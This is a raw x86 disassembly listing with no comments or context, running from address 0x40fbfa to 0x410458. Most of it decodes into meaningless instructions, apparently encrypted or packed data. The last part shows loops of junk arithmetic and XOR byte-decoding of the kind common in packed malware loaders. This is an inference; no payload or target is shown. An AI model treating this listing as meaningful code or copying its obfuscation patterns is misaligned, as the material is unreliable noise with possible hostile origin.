  40fbfa:	loope  0x40fc3b
  40fbfc:	mov    al,0x34
  40fbfe:	pop    edx
  40fbff:	pop    edi
  40fc00:	sub    ebp,DWORD PTR [edi]
  40fc02:	hlt    
  40fc03:	mov    cl,0xdd
  40fc05:	or     al,cl
  40fc07:	js     0x40fbc0
  40fc09:	stos   DWORD PTR es:[edi],eax
  40fc0a:	retf   
  40fc0b:	popf   
  40fc0c:	push   cs
  40fc0d:	popf   
  40fc0e:	lods   al,BYTE PTR ds:[esi]
  40fc0f:	fnstenv [ebp-0xc08adff]
  40fc15:	inc    ebp
  40fc16:	pop    ss
  40fc17:	add    DWORD PTR [esi+edx*1],edi
  40fc1a:	mov    al,ds:0x3333612f
  40fc1f:	cli    
  40fc20:	push   ecx
  40fc21:	imul   BYTE PTR [ecx+0x17]
  40fc24:	inc    edx
  40fc25:	jle    0x40fc02
  40fc27:	int3   
  40fc28:	add    dh,BYTE PTR [edi]
  40fc2a:	ret    
  40fc2b:	in     eax,0x90
  40fc2d:	out    dx,eax
  40fc2e:	inc    edi
  40fc2f:	daa    
  40fc30:	in     eax,0x8c
  40fc32:	adc    bh,BYTE PTR [esi-0x36]
  40fc35:	fadd   QWORD PTR [esi+esi*1]
  40fc38:	jmp    0x40fc2b
  40fc3a:	pop    ss
  40fc3b:	fistp  DWORD PTR [ecx]
  40fc3d:	int3   
  40fc3e:	fisub  WORD PTR [ecx]
  40fc40:	pop    ss
  40fc41:	cmp    ebp,eax
  40fc43:	out    0xb4,eax
  40fc45:	sahf   
  40fc46:	or     ebp,DWORD PTR [edi]
  40fc48:	push   edi
  40fc49:	mov    dh,0x96
  40fc4b:	and    esi,ebx
  40fc4d:	mov    WORD PTR [edx-0x16],?
  40fc50:	fisttp QWORD PTR [edx-0x498e7931]
  40fc56:	and    eax,0xee4e9d41
  40fc5b:	jl     0x40fccd
  40fc5d:	cmp    BYTE PTR [edx-0x41],dl
  40fc60:	adc    eax,0x4b543a00
  40fc65:	pop    ebx
  40fc66:	and    cl,al
  40fc68:	outs   dx,BYTE PTR ds:[esi]
  40fc69:	mov    dh,0xdb
  40fc6b:	(bad)  
  40fc6c:	mov    bh,0x2
  40fc6e:	pop    edi
  40fc6f:	dec    ebp
  40fc70:	xor    eax,0xd1840754
  40fc75:	dec    esi
  40fc76:	pop    ds
  40fc77:	xor    BYTE PTR [ecx-0x36],al
  40fc7a:	fwait
  40fc7b:	sub    al,0xb3
  40fc7d:	addr16 push ecx
  40fc7f:	int3   
  40fc80:	cmp    DWORD PTR [edx-0x40506463],esi
  40fc86:	retf   
  40fc87:	in     al,0xe9
  40fc89:	push   esp
  40fc8a:	push   ds
  40fc8b:	rol    DWORD PTR [eax],1
  40fc8d:	xor    al,0x55
  40fc8f:	xchg   esi,eax
  40fc90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc91:	pop    ebp
  40fc92:	mov    bh,BYTE PTR [eax+0x4b148aff]
  40fc98:	stos   DWORD PTR es:[edi],eax
  40fc99:	xor    eax,0xbd306f0e
  40fc9e:	mov    esi,0xe627d120
  40fca3:	push   es
  40fca4:	mov    dh,0xe7
  40fca6:	mov    ds:0xf5bcc156,eax
  40fcab:	cmp    al,0xaf
  40fcad:	sub    eax,0x37469b28
  40fcb2:	sbb    BYTE PTR [edx+0x3ed49cf4],cl
  40fcb8:	adc    eax,0xcc5248fd
  40fcbd:	imul   BYTE PTR [eax-0x566b305a]
  40fcc3:	mov    eax,0xa7f0e541
  40fcc8:	dec    ebp
  40fcc9:	sbb    dh,BYTE PTR [edx]
  40fccb:	ret    
  40fccc:	and    BYTE PTR [edx-0x31d53694],0x8f
  40fcd3:	sub    BYTE PTR [edi-0x48c5632b],bl
  40fcd9:	in     eax,0xef
  40fcdb:	in     eax,dx
  40fcdc:	jae    0x40fcdc
  40fcde:	adc    eax,0x2ff461a1
  40fce3:	push   esi
  40fce4:	icebp  
  40fce5:	xchg   BYTE PTR [ecx-0x6a327a5f],dh
  40fceb:	jle    0x40fc7f
  40fced:	scas   eax,DWORD PTR es:[edi]
  40fcee:	add    eax,0x7d1ab700
  40fcf3:	xchg   BYTE PTR [edx-0x30],dl
  40fcf6:	jle    0x40fd09
  40fcf8:	ds adc eax,0x75d44e68
  40fcfe:	ror    BYTE PTR [edx-0x62],cl
  40fd01:	sub    BYTE PTR [edi+ecx*1],bh
  40fd04:	fsubr  st(1),st
  40fd06:	inc    eax
  40fd07:	sbb    ah,0xbd
  40fd0a:	daa    
  40fd0b:	push   0x70
  40fd0d:	mov    ch,0x82
  40fd0f:	(bad)  ds:0x3d2315c
  40fd15:	repz add eax,0x391830f1
  40fd1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd1c:	lds    ebp,FWORD PTR [edi+eiz*8]
  40fd1f:	jmp    0x83e3:0x9d50770c
  40fd26:	mov    esi,0xa383c9b4
  40fd2b:	(bad)  
  40fd2c:	shl    DWORD PTR [esi+edi*4],cl
  40fd2f:	mov    ah,0x18
  40fd31:	xchg   edi,eax
  40fd32:	out    0xca,al
  40fd34:	shl    BYTE PTR [edi],0xc2
  40fd37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd38:	ror    edi,1
  40fd3a:	push   0xffffff95
  40fd3c:	sbb    eax,0x27f59d53
  40fd41:	data16 mov bl,0xc0
  40fd44:	mov    edx,0x104f74d6
  40fd49:	pushf  
  40fd4a:	stc    
  40fd4b:	mov    eax,ds:0xc77631fe
  40fd50:	int3   
  40fd51:	push   eax
  40fd52:	gs add eax,0xe4d4819d
  40fd58:	cmp    BYTE PTR [esi],bl
  40fd5a:	jae    0x40fd56
  40fd5c:	adc    eax,0x6869a366
  40fd61:	in     eax,dx
  40fd62:	sub    ah,BYTE PTR [edx+0x7f]
  40fd65:	inc    ebp
  40fd66:	add    dl,BYTE PTR [ecx-0x7b]
  40fd69:	in     eax,dx
  40fd6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd6b:	pop    DWORD PTR [esi-0x7f9a5bd2]
  40fd71:	xor    eax,0x4d76b880
  40fd76:	js     0x40fda2
  40fd78:	pushf  
  40fd79:	sbb    ah,BYTE PTR [eax-0x35]
  40fd7c:	and    ecx,DWORD PTR [edi-0x758a82c4]
  40fd82:	push   esp
  40fd83:	in     al,0xb8
  40fd85:	cmp    eax,DWORD PTR [ebx+0x65]
  40fd88:	xor    ebx,edx
  40fd8a:	xchg   esi,eax
  40fd8c:	or     bh,bh
  40fd8e:	add    dh,al
  40fd90:	jle    0x40fde7
  40fd92:	(bad)  
  40fd93:	jnp    0x40fdbd
  40fd95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd96:	ret    
  40fd97:	push   ebp
  40fd98:	es push edx
  40fd9a:	(bad)  
  40fd9b:	adc    eax,DWORD PTR [esi+esi*4+0x30]
  40fd9f:	sub    BYTE PTR [edi+0x59d17bde],bh
  40fda5:	mov    dl,0x1
  40fda7:	fsubp  st(4),st
  40fda9:	lds    ebx,FWORD PTR [eax]
  40fdab:	(bad)  
  40fdac:	mov    ds:0x71bda5c4,eax
  40fdb1:	lahf   
  40fdb2:	cmc    
  40fdb3:	ins    BYTE PTR es:[edi],dx
  40fdb4:	sub    ah,BYTE PTR [edx+0x7e]
  40fdb7:	mov    dl,0x79
  40fdb9:	aas    
  40fdba:	(bad)  
  40fdbb:	out    0x96,eax
  40fdbd:	aaa    
  40fdbe:	aaa    
  40fdbf:	cld    
  40fdc0:	sbb    ebp,DWORD PTR ss:[edx]
  40fdc3:	(bad)  
  40fdc4:	nop
  40fdc5:	jno    0x40fe29
  40fdc7:	sub    eax,DWORD PTR [ebx+eax*4+0x4f466a2a]
  40fdce:	cmp    DWORD PTR [edx-0x36],0xffffffec
  40fdd2:	ins    DWORD PTR es:[edi],dx
  40fdd3:	fnstcw WORD PTR [edx+0x78]
  40fdd6:	or     eax,0x5d0ca2db
  40fddb:	mov    WORD PTR [ebp+eiz*1-0x78],?
  40fddf:	dec    esi
  40fde0:	sub    BYTE PTR [esi],bl
  40fde2:	add    BYTE PTR [eax],0x52
  40fde5:	and    eax,0x62cb2932
  40fdea:	add    al,0x4a
  40fdec:	outs   dx,BYTE PTR es:[esi]
  40fdee:	pop    ebx
  40fdef:	inc    edx
  40fdf0:	adc    BYTE PTR [ebx+0x1b30d11b],ch
  40fdf6:	(bad)  
  40fdf7:	cld    
  40fdf8:	mov    DWORD PTR [ebx+0x1cc022ea],esi
  40fdfe:	je     0x40fd9f
  40fe00:	mov    ebx,ebp
  40fe02:	mov    edi,0xce63395f
  40fe07:	test   al,0x72
  40fe09:	ret    
  40fe0a:	dec    esp
  40fe0b:	ror    BYTE PTR [ebx+eax*1+0x2022204],0x29
  40fe13:	jmp    0xa422:0x5a8949f6
  40fe1a:	add    BYTE PTR [edx+0x52],dh
  40fe1d:	xchg   ebp,eax
  40fe1e:	push   esp
  40fe1f:	addr16 inc esi
  40fe21:	xor    eax,0x21827c26
  40fe26:	jbe    0x40fe4e
  40fe28:	test   al,0xb2
  40fe2a:	(bad)  
  40fe2b:	jge    0x40fe0c
  40fe2d:	dec    ebx
  40fe2e:	mov    ebp,0x2d324274
  40fe33:	loope  0x40fdcd
  40fe35:	sbb    eax,0xab572c2e
  40fe3a:	mov    ebx,0xd790f5f8
  40fe3f:	add    eax,0xf108a204
  40fe44:	adc    bl,BYTE PTR [ecx]
  40fe46:	inc    esp
  40fe47:	xchg   ebx,eax
  40fe48:	jl     0x40fe73
  40fe4a:	inc    ebx
  40fe4b:	jb     0x40fea4
  40fe4d:	imul   esp,esp,0x78b0aebf
  40fe53:	and    DWORD PTR [esi-0x2],edi
  40fe56:	jb     0x40fe2d
  40fe58:	sahf   
  40fe59:	popa   
  40fe5a:	mov    al,0xa4
  40fe5c:	jb     0x40fea5
  40fe5e:	test   eax,0xbb3b9a2e
  40fe63:	dec    esi
  40fe64:	sbb    DWORD PTR [esi+0x53],esi
  40fe67:	xor    BYTE PTR [edi],bl
  40fe69:	fst    QWORD PTR [ecx-0x53]
  40fe6c:	push   es
  40fe6d:	aam    0x58
  40fe6f:	out    dx,eax
  40fe70:	pop    ss
  40fe71:	sub    al,BYTE PTR [ebx+0x14]
  40fe74:	jmp    0x40fed1
  40fe76:	cmp    BYTE PTR [ecx],al
  40fe78:	jae    0x40fe8c
  40fe7a:	or     dl,cl
  40fe7c:	mov    bh,0x53
  40fe7e:	pop    ecx
  40fe7f:	les    eax,FWORD PTR [ecx]
  40fe81:	xor    DWORD PTR [ebp+0x457f73f0],esi
  40fe87:	mov    edx,0x43d7cc01
  40fe8c:	xchg   ebx,eax
  40fe8d:	xchg   edx,eax
  40fe8e:	and    ebx,DWORD PTR [edx-0x4c]
  40fe91:	icebp  
  40fe92:	rol    BYTE PTR [edi],cl
  40fe94:	push   ecx
  40fe95:	cmp    dl,ah
  40fe97:	xchg   ecx,eax
  40fe98:	retf   
  40fe99:	mov    ?,WORD PTR [edi]
  40fe9b:	outs   dx,DWORD PTR ds:[esi]
  40fe9c:	sub    BYTE PTR [eax-0x59f14c44],dh
  40fea2:	pop    esi
  40fea3:	mov    WORD PTR [eax-0xd5cbbc4],cs
  40fea9:	jnp    0x40fed3
  40feab:	add    DWORD PTR [esi+0x35],ecx
  40feae:	adc    BYTE PTR [edi-0x3a84d5cc],0xf2
  40feb5:	sub    BYTE PTR [ecx],cl
  40feb7:	adc    DWORD PTR [esi+0x3d41b672],ebp
  40febd:	dec    esp
  40febe:	and    dl,BYTE PTR [edx+0x50]
  40fec1:	pop    edx
  40fec2:	inc    edx
  40fec3:	jg     0x40fe98
  40fec5:	adc    dl,cl
  40fec7:	retf   0x74d9
  40feca:	mov    cl,0x6b
  40fecc:	dec    ebp
  40fecd:	call   0xabde:0xd12fd53f
  40fed4:	lods   al,BYTE PTR ds:[esi]
  40fed5:	jmp    0x334d4465
  40feda:	sar    BYTE PTR [ecx+0x7264fca9],cl
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0x20c84346
  40fef3:	jmp    0x40ff17
  40fef5:	fidiv  WORD PTR [ebp+0x7d7c7e7e]
  40fefb:	jle    0x40ff7b
  40fefd:	add    edi,ebp
  40feff:	mov    edi,0x9e3bc812
  40ff04:	pop    ebx
  40ff05:	push   ds
  40ff06:	fdivr  QWORD PTR [edi+ecx*2-0x55]
  40ff0a:	stos   DWORD PTR es:[edi],eax
  40ff0b:	add    eax,0xe15fdcc5
  40ff10:	inc    edx
  40ff11:	pop    esp
  40ff12:	jae    0x40fef8
  40ff14:	sbb    al,0xb1
  40ff16:	sahf   
  40ff17:	mov    ebp,0xf47d5469
  40ff1c:	sub    DWORD PTR [ebx+0x4d6b2d1c],esi
  40ff22:	mov    esi,0x1923c1fd
  40ff27:	jns    0x40ff77
  40ff29:	in     eax,dx
  40ff2a:	cmp    eax,0x3df2ff1f
  40ff2f:	push   esp
  40ff30:	add    BYTE PTR [ecx+0x2],ch
  40ff33:	push   edx
  40ff34:	push   edi
  40ff35:	push   cs
  40ff36:	pusha  
  40ff37:	int    0xc8
  40ff39:	aam    0xd5
  40ff3b:	pop    edx
  40ff3c:	leave  
  40ff3d:	out    dx,al
  40ff3e:	fst    DWORD PTR [bx+di+0x79]
  40ff42:	pop    edi
  40ff43:	cmp    dh,dl
  40ff45:	fcomp  QWORD PTR [edi+0x0]
  40ff48:	mov    esi,0x589aa9dd
  40ff4d:	xchg   esp,eax
  40ff4e:	leave  
  40ff4f:	push   ss
  40ff50:	cmc    
  40ff51:	in     al,0x1d
  40ff53:	das    
  40ff54:	push   ds
  40ff55:	(bad)  
  40ff56:	int3   
  40ff57:	sbb    al,0x7b
  40ff59:	mov    cl,0x6f
  40ff5b:	pop    esi
  40ff5c:	inc    ebp
  40ff5d:	add    ecx,DWORD PTR [edi+0x16]
  40ff60:	adc    ah,BYTE PTR [eax+ebp*8]
  40ff63:	jmp    0x40ffcb
  40ff65:	popa   
  40ff66:	retf   0xf640
  40ff69:	sub    dl,ch
  40ff6b:	mov    edx,0xbe3e8272
  40ff70:	push   cs
  40ff71:	sbb    cl,BYTE PTR [eax-0x56]
  40ff74:	inc    esp
  40ff75:	sti    
  40ff76:	cmp    ebx,DWORD PTR [ebx]
  40ff78:	fwait
  40ff79:	dec    ebx
  40ff7a:	(bad)  
  40ff7b:	int3   
  40ff7c:	std    
  40ff7d:	fild   DWORD PTR [ebx]
  40ff7f:	in     al,0x84
  40ff81:	jmp    0x40ffa4
  40ff83:	leave  
  40ff84:	mov    ds:0x6911aee,eax
  40ff89:	mov    dh,0xe1
  40ff8b:	rcr    BYTE PTR [esi-0xd5e42a],1
  40ff91:	maskmovq mm6,(bad)
  40ff92:	div    DWORD PTR [ecx]
  40ff94:	inc    edi
  40ff95:	mov    bh,BYTE PTR ds:0xfb7cc1b2
  40ff9b:	jb     0x40ff77
  40ff9d:	mov    ds:0xbd009d11,al
  40ffa2:	mov    ebx,0xe1b40c9f
  40ffa7:	adc    DWORD PTR [ebx+0x192497d5],0x53
  40ffae:	ins    BYTE PTR es:[edi],dx
  40ffaf:	push   edx
  40ffb0:	call   0x414d:0x6bd4697b
  40ffb7:	sub    bh,BYTE PTR [edi+0x1e]
  40ffba:	mov    eax,ds:0xb2a23ab9
  40ffbf:	lods   eax,DWORD PTR ds:[esi]
  40ffc0:	out    0x49,al
  40ffc2:	cmp    al,0xd9
  40ffc4:	inc    ebx
  40ffc5:	jns    0x40ffe8
  40ffc7:	pop    edx
  40ffc8:	push   0x9811e856
  40ffcd:	jecxz  0x40ff5f
  40ffcf:	sub    cl,BYTE PTR [esi-0x38]
  40ffd2:	shl    DWORD PTR [eax+0x49],cl
  40ffd5:	xchg   BYTE PTR [ebx+0x49],ah
  40ffd8:	xchg   ebx,eax
  40ffd9:	rcr    esi,cl
  40ffdb:	test   BYTE PTR [edx+eax*8+0x6f],bl
  40ffdf:	js     0x40ffba
  40ffe1:	daa    
  40ffe2:	jns    0x40ff75
  40ffe4:	arpl   ax,sp
  40ffe6:	sub    al,0xb
  40ffe8:	dec    eax
  40ffe9:	cli    
  40ffea:	sbb    al,0x4
  40ffec:	push   ebp
  40ffed:	xchg   edx,eax
  40ffee:	or     eax,0xcc38e8ee
  40fff3:	push   eax
  40fff4:	mov    ah,0xd0
  40fff6:	xchg   al,ch
  40fff8:	ins    BYTE PTR es:[edi],dx
  40fff9:	jmp    0x410029
  40fffb:	mov    ch,0xf0
  40fffd:	inc    edi
  40fffe:	loope  0x40ffe2
  410000:	push   esp
  410001:	stc    
  410002:	cmp    eax,0x58242d9e
  410007:	pop    es
  410008:	fisttp WORD PTR [ebx+eiz*4-0x25]
  41000c:	out    0x52,eax
  41000e:	mov    al,ds:0x6037d0a6
  410013:	or     ebx,edi
  410015:	jns    0x40ffa8
  410017:	pop    ecx
  410018:	add    bh,bl
  41001a:	adc    DWORD PTR [ecx+ecx*8],edx
  41001d:	stc    
  41001e:	(bad)  
  41001f:	ins    DWORD PTR es:[edi],dx
  410020:	call   0x7186:0xb305cce4
  410027:	cld    
  410028:	rcl    eax,0x5b
  41002b:	ror    BYTE PTR [ebx],cl
  41002d:	stc    
  41002e:	(bad)  
  41002f:	and    al,0x5
  410031:	sub    dh,cl
  410033:	or     al,0xe7
  410035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410036:	call   0xf8dc8dee
  41003b:	jecxz  0x4100a8
  41003d:	jb     0x40ffca
  41003f:	sar    DWORD PTR [eax+0x4a],0xc4
  410043:	pop    es
  410044:	dec    edi
  410045:	xor    DWORD PTR [edx-0x48],esp
  410048:	pop    ebp
  410049:	mov    esp,0xe1a888b9
  41004e:	mov    eax,ds:0x562963e7
  410053:	(bad)  
  410055:	hlt    
  410056:	mov    bh,0x1a
  410058:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410059:	loopne 0x410025
  41005b:	xchg   ebx,eax
  41005c:	add    dl,BYTE PTR [edx]
  41005e:	pmaxsw mm0,QWORD PTR [eax-0x50e3dc7d]
  410065:	push   ebp
  410066:	lock sbb cl,dh
  410069:	push   edi
  41006a:	gs cmp ecx,esi
  41006d:	(bad)  [ebp-0x3d72e9d5]
  410073:	pop    es
  410074:	lea    edx,[ecx-0x70]
  410077:	dec    ecx
  410078:	das    
  410079:	mov    edi,0x5d3213fc
  41007e:	mov    edi,0x5b57611
  410083:	into   
  410084:	not    cl
  410086:	adc    BYTE PTR [esp+eax*4],dh
  410089:	adc    esp,DWORD PTR [edi]
  41008b:	loop   0x4100d7
  41008d:	imul   esp,DWORD PTR [esi-0x42],0x42e79f4a
  410094:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410095:	in     eax,0x8e
  410097:	and    al,0x91
  410099:	and    bl,BYTE PTR [ebp-0x39e6987b]
  41009f:	push   ds
  4100a0:	sub    al,cl
  4100a2:	and    BYTE PTR [ebp+eiz*8+0xeb3e1b8],dh
  4100a9:	jmp    0xcf96032a
  4100ae:	inc    edi
  4100af:	inc    ebp
  4100b0:	or     BYTE PTR [ebx],dl
  4100b2:	dec    ebx
  4100b3:	dec    esi
  4100b4:	xchg   esp,eax
  4100b5:	cmp    eax,0x3cf562d5
  4100ba:	lock cdq 
  4100bc:	mov    DWORD PTR [edi-0x73682095],edx
  4100c2:	scas   eax,DWORD PTR es:[edi]
  4100c3:	sub    esp,edi
  4100c5:	stos   DWORD PTR es:[edi],eax
  4100c6:	inc    edi
  4100c7:	jle    0x410053
  4100c9:	fsubp  st(3),st
  4100cb:	mov    cl,0xf
  4100cd:	add    al,0xd2
  4100cf:	mov    dl,0x9
  4100d1:	lahf   
  4100d2:	sub    BYTE PTR [ebx+ebp*4],dl
  4100d5:	sar    DWORD PTR [esi-0x6b3766d],0x9
  4100dc:	push   0xcc18245e
  4100e1:	inc    edx
  4100e2:	fs cmc 
  4100e4:	cmc    
  4100e5:	es scas eax,DWORD PTR es:[edi]
  4100e7:	inc    esp
  4100e8:	adc    al,0x53
  4100ea:	lds    ebx,FWORD PTR [ebp+eiz*4-0x57]
  4100ee:	mov    dl,bh
  4100f0:	sbb    ecx,ebp
  4100f2:	in     eax,0x87
  4100f4:	sub    al,0x6
  4100f6:	mov    ecx,0x2af67b2
  4100fb:	leave  
  4100fc:	ins    DWORD PTR es:[edi],dx
  4100fd:	bound  edi,QWORD PTR [edi]
  4100ff:	(bad)  
  410100:	push   ecx
  410101:	js     0x4100e9
  410103:	and    dh,BYTE PTR ds:0xa4cf1f59
  410109:	lock push 0xffffffb9
  41010c:	and    esi,edx
  41010e:	enter  0xd221,0xc9
  410112:	ins    DWORD PTR es:[edi],dx
  410113:	sti    
  410114:	xor    BYTE PTR [ebp-0x74],ch
  410117:	sbb    eax,0x8dc9c87b
  41011c:	mov    ecx,ebp
  41011e:	je     0x410148
  410120:	aas    
  410121:	xchg   ebp,eax
  410122:	cli    
  410123:	stos   BYTE PTR es:[edi],al
  410124:	mov    ah,0xed
  410126:	and    eax,0x200c43d1
  41012b:	and    eax,0xabfa6e14
  410130:	ss hlt 
  410132:	sub    ch,BYTE PTR [ecx]
  410134:	enter  0x41c3,0x6
  410138:	or     dh,cl
  41013a:	cli    
  41013b:	mov    al,0x1
  41013d:	js     0x4100fa
  41013f:	lods   al,BYTE PTR ds:[esi]
  410140:	cmp    ecx,DWORD PTR [ebp-0x7a]
  410143:	dec    esp
  410144:	fcomp  st(2)
  410146:	test   ecx,edi
  410148:	lock stos BYTE PTR es:[edi],al
  41014a:	xchg   BYTE PTR [ebx],ah
  41014c:	mov    edi,DWORD PTR [ebx-0x4f]
  41014f:	mov    al,0x3d
  410151:	dec    esp
  410152:	push   eax
  410153:	mov    edi,0x4af67a8f
  410158:	mov    DWORD PTR [eax+edi*1-0x16],edi
  41015c:	lods   eax,DWORD PTR ds:[esi]
  41015d:	xchg   edx,eax
  41015e:	(bad)  
  41015f:	addr16 in al,0xb4
  410162:	jmp    0xcb84d708
  410167:	mov    edi,0x1c1827c4
  41016c:	cmp    eax,edi
  41016e:	stos   DWORD PTR es:[edi],eax
  41016f:	adc    eax,0x20261142
  410174:	lahf   
  410175:	pop    ecx
  410176:	mov    ecx,0x8402ab2e
  41017b:	xchg   edi,eax
  41017c:	jecxz  0x4101e1
  41017e:	or     ebp,DWORD PTR [edi]
  410180:	lahf   
  410181:	arpl   WORD PTR [ebp-0xc],ax
  410184:	int    0xe1
  410186:	xchg   edi,eax
  410187:	enter  0xe70,0xd6
  41018b:	mov    ds:0xee010cf9,al
  410190:	push   esi
  410191:	shl    DWORD PTR [eax],1
  410193:	lods   al,BYTE PTR ds:[esi]
  410194:	and    DWORD PTR [ebp-0x4037b6eb],ebx
  41019a:	arpl   WORD PTR [ebp-0x26],di
  41019d:	cwde   
  41019e:	push   esi
  41019f:	mov    ds:0x1cf970ad,al
  4101a4:	adc    edi,ecx
  4101a6:	add    al,0xaf
  4101a8:	sahf   
  4101a9:	pop    esi
  4101aa:	inc    ecx
  4101ab:	das    
  4101ac:	mov    ecx,0xe2fdfaa3
  4101b1:	js     0x4101fd
  4101b3:	lea    esp,[eax+0x235a0c7c]
  4101b9:	push   ss
  4101ba:	daa    
  4101bb:	xchg   ebx,eax
  4101bc:	push   edi
  4101bd:	in     al,0xc3
  4101bf:	(bad)
  4101c2:	mov    eax,ds:0x1d1a3cd8
  4101c7:	fist   DWORD PTR [ebx]
  4101c9:	jb     0x410203
  4101cb:	push   edi
  4101cc:	xor    BYTE PTR [eax+0x49c14ee4],al
  4101d2:	mov    bh,0xfe
  4101d4:	push   ebx
  4101d5:	sbb    DWORD PTR [edx+0x4a0b4425],esi
  4101db:	xchg   ecx,eax
  4101dc:	mov    cl,0x74
  4101de:	xchg   edx,eax
  4101df:	adc    edx,edx
  4101e1:	iret   
  4101e2:	mov    ch,0xd1
  4101e4:	adc    DWORD PTR [eax+0x6eb09130],0xbf152ecb
  4101ee:	sti    
  4101ef:	jns    0x410241
  4101f1:	daa    
  4101f2:	in     al,0xbe
  4101f4:	call   0x986:0x6b89a75e
  4101fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101fc:	mov    DWORD PTR [esi+0x46],esi
  4101ff:	div    ecx
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43369f
  41021e:	adc    DWORD PTR ds:0x4336d7,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43360b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x43372b,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x4336df
  41026b:	or     DWORD PTR ds:0x4336d7,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x4336ab,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x4336ab
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x4336ab,ecx
  410291:	cmp    DWORD PTR ds:0x4336ab,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x4336ab,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x4336ab,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x4336ab
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x4336ab,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433603
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x4336e7,0x43369f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x4336e3,0x433697
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x433657
  41031a:	sub    DWORD PTR ds:0x43361f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x43365b,0x0
  410338:	mov    ecx,DWORD PTR ds:0x43365b
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x43365b,ecx
  410345:	cmp    DWORD PTR ds:0x43365b,0x25
  41034c:	jne    0x410362
  410352:	push   0x4337af
  410357:	push   0x4337ef
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x43365b,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43369f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433713,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433713
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433713,ecx
  41038f:	cmp    DWORD PTR ds:0x433713,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x4336e7
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433713,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433713
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433713,ecx
  4103c8:	cmp    DWORD PTR ds:0x433713,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x43365f,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x433657,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x433657
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x433657,esi
  4103ff:	cmp    DWORD PTR ds:0x433657,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x433657,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
